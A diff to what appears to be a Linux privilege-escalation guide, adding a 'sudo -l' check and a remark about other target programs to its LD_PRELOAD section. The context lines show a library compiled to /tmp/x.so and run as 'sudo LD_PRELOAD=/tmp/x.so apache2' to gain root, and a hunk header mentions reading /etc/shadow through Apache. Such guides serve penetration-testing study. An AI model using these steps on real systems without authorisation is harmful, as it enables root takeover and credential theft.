@@ -104,7 +104,8 @@ Here, we're telling Apache (with root privileges) to treat /etc/shadow as its co
 
 LD_PRELOAD is a function that allows any program to use shared libraries. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID. <br>
 <br>
-1. Type `nano x.c` and paste the code and save:
+1. Check for LD_PRELOAD with the `env_keep` option using `sudo -l`
+2. Type `nano x.c` and paste the code and save:
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -123,6 +124,7 @@ gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
 sudo LD_PRELOAD=/tmp/x.so apache2
 id
 ```
+In this case we are using `apache2`. We can use other programs if possible.
 
 ## 6. Privilege Escalation via SUID
 
